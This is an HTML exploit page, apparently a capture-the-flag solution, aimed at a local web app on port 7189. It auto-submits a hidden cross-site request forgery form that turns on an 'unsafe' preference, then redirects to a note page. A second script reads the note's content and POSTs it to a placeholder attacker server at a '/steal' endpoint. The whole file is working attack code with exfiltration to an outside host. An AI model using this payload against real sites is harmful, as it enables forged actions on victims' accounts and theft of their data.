<!-- exploit.html -->
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
  <!-- 1) CSRF toggle -->
  <form id="t" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
    <input type="hidden" name="enable" value="1">
    <input type="hidden" name="id" value="1">
  </form>
  <script>
    // Submit the toggle form
    document.getElementById('t').submit();

    // After a brief pause, navigate to the botâ€™s note
    setTimeout(()=> {
      window.location = 'http://127.0.0.1:7189/notes/1';
    }, 1000);
  </script>

  <!-- 2) When on /notes/1, this runs: -->
  <script>
  if (window.location.pathname === '/notes/1') {
    // Grab the flag text from wherever your template puts it
    const flag = document.querySelector('.note-content').innerText;
    // Send it back to you
    fetch('http://YOUR.SERVER.SHERE/steal', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ flag })
    });
  }
  </script>
</body>
</html>
